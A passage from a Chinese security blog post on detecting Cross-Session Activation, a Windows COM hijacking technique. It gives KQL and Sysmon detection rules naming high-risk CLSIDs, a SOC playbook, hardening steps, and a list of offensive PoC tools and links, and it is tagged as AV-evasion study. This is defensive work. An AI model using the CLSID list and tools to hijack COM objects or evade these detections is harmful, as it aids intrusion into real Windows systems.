+<h4 id="Defender-for-Endpoint-KQL-版本"><a href="#Defender-for-Endpoint-KQL-版本" class="headerlink" title="Defender for Endpoint KQL 版本"></a>Defender for Endpoint KQL 版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DeviceProcessEvents</span><br><span class="line">| where InitiatingProcessFileName =~ &quot;HelpPane.exe&quot;</span><br><span class="line">| where FileName !in~ (&quot;HelpPane.exe&quot;,&quot;iexplore.exe&quot;,&quot;msedge.exe&quot;,&quot;msedgewebview2.exe&quot;)</span><br><span class="line">| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine,</span><br><span class="line">          FileName, ProcessCommandLine, InitiatingProcessSessionId, ProcessId</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他异常进程监控"><a href="#其他异常进程监控" class="headerlink" title="其他异常进程监控"></a>其他异常进程监控</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">监控以下进程的异常启动：</span><br><span class="line"></span><br><span class="line">  HelpPane.exe    → IHxHelpPaneServer COM 对象触发</span><br><span class="line">  slui.exe        → sppui COM 对象触发</span><br><span class="line">  WmiPrvSE.exe    → 远程 CSA 通过 WMI 触发时出现</span><br><span class="line"></span><br><span class="line">异常判断标准：</span><br><span class="line">  ① 进程在不该出现的时间出现</span><br><span class="line">  ② 父进程不符合常规模式</span><br><span class="line">  ③ 子进程不符合该进程的正常行为</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-检测二：注册表监控（Event-ID-4663）"><a href="#8-3-检测二：注册表监控（Event-ID-4663）" class="headerlink" title="8.3 检测二：注册表监控（Event ID 4663）"></a>8.3 检测二：注册表监控（Event ID 4663）</h3><h4 id="启用审计"><a href="#启用审计" class="headerlink" title="启用审计"></a>启用审计</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">组策略路径：</span><br><span class="line">Computer Configuration → Policies → Windows Settings →</span><br><span class="line">Security Settings → Advanced Audit Policy Configuration →</span><br><span class="line">Audit Policies → Object Access → Audit Registry</span><br><span class="line"></span><br><span class="line">设置为：Success</span><br></pre></td></tr></table></figure>
+
+<h4 id="锁定监控的-CLSID"><a href="#锁定监控的-CLSID" class="headerlink" title="锁定监控的 CLSID"></a>锁定监控的 CLSID</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">组策略路径：</span><br><span class="line">Computer Configuration → Policies → Windows Settings →</span><br><span class="line">Security Settings → Registry</span><br><span class="line"></span><br><span class="line">添加需要监控的 CLSID 注册表键：</span><br><span class="line">  HKLM\SOFTWARE\Classes\CLSID\&#123;F87B28F1...&#125;\LocalServer32</span><br><span class="line">  HKLM\SOFTWARE\Classes\CLSID\&#123;924DC564...&#125;\LocalServer32</span><br><span class="line">  HKLM\SOFTWARE\Classes\CLSID\&#123;8cec592c...&#125;\LocalServer32</span><br><span class="line">  ...（所有已知高危 CLSID）</span><br></pre></td></tr></table></figure>
+
+<h4 id="监控的关键操作"><a href="#监控的关键操作" class="headerlink" title="监控的关键操作"></a>监控的关键操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在 Event ID 4663 中关注以下操作：</span><br><span class="line"></span><br><span class="line">  SetValue       → 修改 DLL/EXE 路径（最直接的攻击行为）</span><br><span class="line">  Create Subkey  → 新建 InprocServer32（HKCU 里新建键）</span><br><span class="line">  Delete         → 删除原始路径（掩盖痕迹）</span><br><span class="line">  Write DAC      → 修改权限（为了持久化）</span><br><span class="line"></span><br><span class="line">告警条件：</span><br><span class="line">  Event ID 4663</span><br><span class="line">  + 对象名包含高危 CLSID</span><br><span class="line">  + 访问类型是 SetValue / Create Subkey</span><br><span class="line">  + 主体是 Everyone 或 Authenticated Users</span><br><span class="line">  + 时间集中在同一个窗口期</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-4-检测三：API-钩子监控"><a href="#8-4-检测三：API-钩子监控" class="headerlink" title="8.4 检测三：API 钩子监控"></a>8.4 检测三：API 钩子监控</h3><p>EDR 应该钩子以下 API 调用：</p>
+<table>
+<thead>
+<tr>
+<th>API</th>
+<th>检测什么</th>
+<th>告警逻辑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WTSOpenServer</td>
+<td>连接到远程会话服务器</td>
+<td>非系统进程调用 → 可疑</td>
+</tr>
+<tr>
+<td>WTSEnumerateSessions</td>
+<td>枚举目标系统的所有会话</td>
+<td>配合 COM 激活 → CSA 特征</td>
+</tr>
+<tr>
+<td>WTSQuerySessionInformation</td>
+<td>查询某个会话的详细信息</td>
+<td>查询特定用户会话 → 可疑</td>
+</tr>
+<tr>
+<td>CoCreateInstance</td>
+<td>创建 COM 实例（指定 CLSID）</td>
+<td>CLSID 是已知高危 → 告警</td>
+</tr>
+<tr>
+<td>QueryInterface</td>
+<td>查询 COM 接口</td>
+<td>配合 SetSessionId → CSA 特征</td>
+</tr>
+</tbody></table>
+<p><strong>关联告警逻辑：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">时间窗口（5分钟内）同时出现：</span><br><span class="line"></span><br><span class="line">  进程 A 调用了 WTSOpenServer + WTSEnumerateSessions</span><br><span class="line">  → 紧接着调用了 CoCreateInstance</span><br><span class="line">  → CoCreateInstance 的 CLSID 是已知高危 CLSID</span><br><span class="line">  → 告警！</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-5-检测四：Sysmon-规则"><a href="#8-5-检测四：Sysmon-规则" class="headerlink" title="8.5 检测四：Sysmon 规则"></a>8.5 检测四：Sysmon 规则</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.90&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">HashAlgorithms</span>&gt;</span>md5,sha256<span class="tag">&lt;/<span class="name">HashAlgorithms</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 监控高危 CLSID 注册表写入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RegistryEvent</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        Classes\CLSID\&#123;F87B28F1-DA9A-4F35-8EC0-800EFCF26B83&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        Classes\CLSID\&#123;8cec592c-07a1-11d9-b15e-000d56bfe6ee&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        Classes\CLSID\&#123;924DC564-16A6-42EB-929A-9A61FA7DA06F&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RegistryEvent</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 监控 HelpPane.exe 进程创建 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessCreate</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>HelpPane.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessCreate</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 监控 slui.exe 进程创建 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessCreate</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>slui.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessCreate</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-6-检测五：行为关联分析（最有效）"><a href="#8-6-检测五：行为关联分析（最有效）" class="headerlink" title="8.6 检测五：行为关联分析（最有效）"></a>8.6 检测五：行为关联分析（最有效）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">时间窗口（5分钟内）同时出现以下行为：</span><br><span class="line"></span><br><span class="line">  [1] Event ID 4663：某 CLSID 的注册表键被写入</span><br><span class="line">       ↓</span><br><span class="line">  [2] API 调用：WTSEnumerateSessions（会话枚举）</span><br><span class="line">       ↓</span><br><span class="line">  [3] CoCreateInstance 被调用（COM 对象激活）</span><br><span class="line">       ↓</span><br><span class="line">  [4] Event ID 4688：HelpPane.exe 或 slui.exe 启动</span><br><span class="line">       ↓</span><br><span class="line">  [5] Event ID 4688：HelpPane.exe 的子进程是非浏览器</span><br><span class="line"></span><br><span class="line">  → 告警置信度：Critical</span><br><span class="line"></span><br><span class="line">单条告警可能误报</span><br><span class="line">但 5 条关联 = 几乎确定是 CSA 攻击</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、数据源与检测矩阵"><a href="#九、数据源与检测矩阵" class="headerlink" title="九、数据源与检测矩阵"></a>九、数据源与检测矩阵</h2><table>
+<thead>
+<tr>
+<th>数据源</th>
+<th>数据组件</th>
+<th>检测什么</th>
+<th>Event ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>API</td>
+<td>WTSOpenServer</td>
+<td>会话服务器连接</td>
+<td>Sysmon&#x2F;EDR</td>
+</tr>
+<tr>
+<td>API</td>
+<td>WTSEnumerateSessions</td>
+<td>会话枚举</td>
+<td>Sysmon&#x2F;EDR</td>
+</tr>
+<tr>
+<td>API</td>
+<td>WTSQuerySessionInformation</td>
+<td>会话信息查询</td>
+<td>Sysmon&#x2F;EDR</td>
+</tr>
+<tr>
+<td>Windows Events</td>
+<td>进程创建</td>
+<td>HelpPane&#x2F;slui 异常启动</td>
+<td><strong>4688</strong></td>
+</tr>
+<tr>
+<td>Windows Events</td>
+<td>注册表写入</td>
+<td>CLSID 被篡改</td>
+<td><strong>4663</strong></td>
+</tr>
+<tr>
+<td>Sysmon</td>
+<td>RegistryEvent</td>
+<td>CLSID 注册表监控</td>
+<td><strong>13</strong></td>
+</tr>
+<tr>
+<td>Sysmon</td>
+<td>ProcessAccess</td>
+<td>COM 句柄访问</td>
+<td><strong>10</strong></td>
+</tr>
+<tr>
+<td>EDR</td>
+<td>行为关联</td>
+<td>多步骤攻击关联</td>
+<td>无单一 ID</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十、工具清单"><a href="#十、工具清单" class="headerlink" title="十、工具清单"></a>十、工具清单</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>作者</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PermissionHunter</td>
+<td>Michael Zhmaylo (CICADA8)</td>
+<td>枚举 COM 对象权限，输出 .xlsx</td>
+</tr>
+<tr>
+<td>CLSIDBruteforceScanner</td>
+<td>—</td>
+<td>内存中扫描 CLSID</td>
+</tr>
+<tr>
+<td>SessionEnumeration</td>
+<td>私有工具</td>
+<td>本地&#x2F;远程会话枚举，支持 IP 范围</td>
+</tr>
+<tr>
+<td>ComDiver</td>
+<td>—</td>
+<td>识别可劫持的 COM 对象路径</td>
+</tr>
+<tr>
+<td>ComHijackWrite</td>
+<td>—</td>
+<td>写入 COM 劫持注册表</td>
+</tr>
+<tr>
+<td>IHxExec</td>
+<td>Michael Zhmaylo</td>
+<td>IHxHelpPaneServer 最小化 PoC</td>
+</tr>
+<tr>
+<td>SessionHop</td>
+<td>Andrew Oliveau</td>
+<td>本地&#x2F;远程会话跳转 PoC</td>
+</tr>
+<tr>
+<td>sppui.exe</td>
+<td>—</td>
+<td>sppui COM 接口远程执行 PoC</td>
+</tr>
+<tr>
+<td>COMThanasia</td>
+<td>Michael Zhmaylo (CICADA8)</td>
+<td>COM 分析工具套件</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十一、防御建议"><a href="#十一、防御建议" class="headerlink" title="十一、防御建议"></a>十一、防御建议</h2><h3 id="11-1-减少攻击面（事前）"><a href="#11-1-减少攻击面（事前）" class="headerlink" title="11.1 减少攻击面（事前）"></a>11.1 减少攻击面（事前）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 枚举环境中所有 RunAs=Interactive User 的 CLSID</span><br><span class="line">2. 确认哪些 CLSID 业务上真正需要</span><br><span class="line">3. 对不需要的 CLSID：</span><br><span class="line">   → 修改 RunAs 配置（改为Launching User 或 System Account）</span><br><span class="line">   → 或直接禁用该 COM 类</span><br><span class="line">4. 禁用不需要的 RemoteRegistry 服务</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-2-注册表监控（事中）"><a href="#11-2-注册表监控（事中）" class="headerlink" title="11.2 注册表监控（事中）"></a>11.2 注册表监控（事中）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 对已知高危 CLSID 启用注册表审计</span><br><span class="line">2. 监控 SetValue / Create Subkey / Delete / Write DAC 操作</span><br><span class="line">3. 在组策略中添加 CLSID 监控规则</span><br><span class="line">4. 配合 Sysmon RegistryEvent 进行实时监控</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-3-进程行为监控（事中）"><a href="#11-3-进程行为监控（事中）" class="headerlink" title="11.3 进程行为监控（事中）"></a>11.3 进程行为监控（事中）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. HelpPane.exe 出现 → 立即关注（现代 Windows 不应正常使用）</span><br><span class="line">2. slui.exe 非正常启动 → 告警</span><br><span class="line">3. WmiPrvSE.exe 创建子进程 → 关联其他行为判断</span><br><span class="line">4. 关注父-子进程异常关系</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-4-EDR-能力验证"><a href="#11-4-EDR-能力验证" class="headerlink" title="11.4 EDR 能力验证"></a>11.4 EDR 能力验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">与 EDR 厂商确认以下能力：</span><br><span class="line">  1. 是否钩子了 WTSOpenServer / WTSEnumerateSessions / WTSQuerySessionInformation</span><br><span class="line">  2. 是否能监控 CoCreateInstance 调用及参数</span><br><span class="line">  3. 是否能关联注册表修改和进程创建</span><br><span class="line">  4. 是否能检测跨会话的 COM 激活</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-5-SOC-操作手册"><a href="#11-5-SOC-操作手册" class="headerlink" title="11.5 SOC 操作手册"></a>11.5 SOC 操作手册</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当告警触发时：</span><br><span class="line"></span><br><span class="line">1. 确认告警来源进程是否为高价值目标</span><br><span class="line">2. 检查事件时间窗口内的所有相关行为：</span><br><span class="line">   - 注册表写入（Event ID 4663）</span><br><span class="line">   - 进程创建（Event ID 4688）</span><br><span class="line">   - API 调用（WTSOpenServer 等）</span><br><span class="line">3. 确认被利用的 CLSID 和受影响的会话</span><br><span class="line">4. 检查目标会话用户是否有异常出站连接</span><br><span class="line">5. 取证：记录注册表修改内容、进程创建链</span><br><span class="line">6. 回溯攻击链：WriteProcessMemory 的来源进程</span><br><span class="line">7. 隔离受影响会话，终止可疑进程</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十二、技术局限性"><a href="#十二、技术局限性" class="headerlink" title="十二、技术局限性"></a>十二、技术局限性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">CSA 攻击有以下限制：</span><br><span class="line"></span><br><span class="line">1. COM 对象必须配置为 RunAs=Interactive User</span><br><span class="line">   → 不是所有 COM 对象都满足</span><br><span class="line">   → 这是 CSA 的定义性条件，无法绕过</span><br><span class="line"></span><br><span class="line">2. 目标必须有活跃的交互式会话</span><br><span class="line">   → 断开的 RDP 会话（Disconnected）不行</span><br><span class="line">   → 会话 0（系统服务）的用户不行</span><br><span class="line">   → 这意味着攻击者必须等待管理员&quot;在线&quot;才能触发</span><br><span class="line"></span><br><span class="line">3. COM 类必须提供能执行命令或文件的方法</span><br><span class="line">   → 或者可以通过 DLL 劫持间接执行</span><br><span class="line">   → 不是所有 COM 对象都有 Execute() 这样的方法</span><br><span class="line"></span><br><span class="line">4. 远程场景需要管理员权限 + RemoteRegistry</span><br><span class="line">   → 本地场景不一定需要管理员权限（修改 HKCU 即可）</span><br><span class="line">   → RemoteRegistry 默认禁用，需要管理员远程启动</span><br><span class="line"></span><br><span class="line">5. CLSID 数量虽多，但每个都有特定条件</span><br><span class="line">   → 防御方可以针对性监控</span><br><span class="line"></span><br><span class="line">6. 时机依赖：必须等到目标用户交互式登录</span><br><span class="line">   → 如果目标用户没有登录，攻击无法触发</span><br><span class="line">   → 这给了防御方一个时间窗口</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十三、技术演进"><a href="#十三、技术演进" class="headerlink" title="十三、技术演进"></a>十三、技术演进</h2><table>
+<thead>
+<tr>
+<th>时间</th>
+<th>进展</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2024</td>
+<td>CVE-2024-38100</td>
+<td>IHxHelpPaneServer 漏洞公开</td>
+</tr>
+<tr>
+<td>2025</td>
+<td>Fabian Mosch Troopers 演讲</td>
+<td>CSA 技术系统化研究，BitLocker&#x2F;Speech PoC</td>
+</tr>
+<tr>
+<td>2025</td>
+<td>Michael Zhmaylo COMThanasia</td>
+<td>COM 分析工具套件发布</td>
+</tr>
+<tr>
+<td>2025</td>
+<td>Andrew Oliveau SessionHop</td>
+<td>会话跳转 PoC 发布</td>
+</tr>
+<tr>
+<td>2026</td>
+<td>ipurple.team CSA 文章</td>
+<td>技术文档化，检测方法公开</td>
+</tr>
+</tbody></table>
+<p><strong>趋势：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. COM 滥用技术越来越成熟</span><br><span class="line">2. 利用 Windows 合法机制的攻击越来越难检测</span><br><span class="line">3. 检测重点从单点告警转向行为关联分析</span><br><span class="line">4. CLSID 枚举和监控成为防御的基础工作</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>原文：<a target="_blank" rel="noopener" href="https://ipurple.team/2026/05/04/cross-session-activation/">https://ipurple.team/2026/05/04/cross-session-activation/</a></li>
+<li>SessionHop PoC：<a target="_blank" rel="noopener" href="https://github.com/3lp4tr0n/SessionHop">https://github.com/3lp4tr0n/SessionHop</a></li>
+<li>COMThanasia 套件：<a target="_blank" rel="noopener" href="https://github.com/CICADA8-Research/COMThanasia">https://github.com/CICADA8-Research/COMThanasia</a></li>
+<li>CVE-2024-38100：<a target="_blank" rel="noopener" href="https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d">https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d</a></li>
+<li>CVE-2024-38100 分析：<a target="_blank" rel="noopener" href="https://decoder.cloud/2024/07/16/cve-2024-38100-leaked-wallpaper/">https://decoder.cloud/2024/07/16/cve-2024-38100-leaked-wallpaper/</a></li>
+<li>研究者：Fabian Mosch (@ShitSecure)、Michael Zhmaylo (CICADA8 Research)、Andrew Oliveau (@AndrewOliveau)</li>
+</ul>
+</div>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2026-05-16</span>
+            
+                <span>该篇文章被 CHANGMEN</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E5%85%8D%E6%9D%80/'>
+                            免杀
+                        </a>
+                    
+                </span>
+             
+             
+        
+        </i>
+    </div>
+    <br>
+    
+    
+        
+            
+    
+            <div class="post-footer-pre-next">
+                
+
+                
+                    <span class="post-footer-pre-next-last-span-right">下一篇：<a href="/2026/05/15/EntryPoint-Hijacking%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">EntryPoint Hijacking（入口点劫持）技术学习</a>
+                    </span>
+                
+            </div>
+    
+        
+    
+
+    
+        
+
+     
+</div>
+
+
+
+
+                    
+
+                    <div class="footer">
+    
+        <span> 
+            © 2024 CHANGMEN | Network Security Enthusiast 
+
+            
+                
+
+            
+        </span>
+       
+    
+</div>
+
+
+
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊看过大海的人不会忘记海的广阔🌊</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery/lightgallery.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-thumbnail.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-fullscreen.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-autoplay.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-zoom.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-rotate.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-paper.umd.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+     
+    if (typeof lightGallery !== "undefined") {
+        var options1 = {
+            selector: '.gallery-item',
+            plugins: [lgThumbnail, lgFullscreen, lgAutoplay, lgZoom, lgRotate, lgPager], // 启用插件
+            thumbnail: true,          // 显示缩略图
+            zoom: true,               // 启用缩放功
+            rotate: true,             // 启用旋转功能能
+            autoplay: true,        // 启用自动播放功能
+            fullScreen: true,      // 启用全屏功能
+            pager: false, //页码,
+            zoomFromOrigin: true,   // 从原始位置缩放
+            actualSize: true,       // 启用查看实际大小的功能
+            enableZoomAfter: 300,    // 延迟缩放，确保图片加载完成后可缩放
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1); // 修复选择器
+    }
+    
+</script>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> 
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+</html>
+<script src="/js/emojiHandler.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        wrapEmojis('.paper');
+    });
+</script>
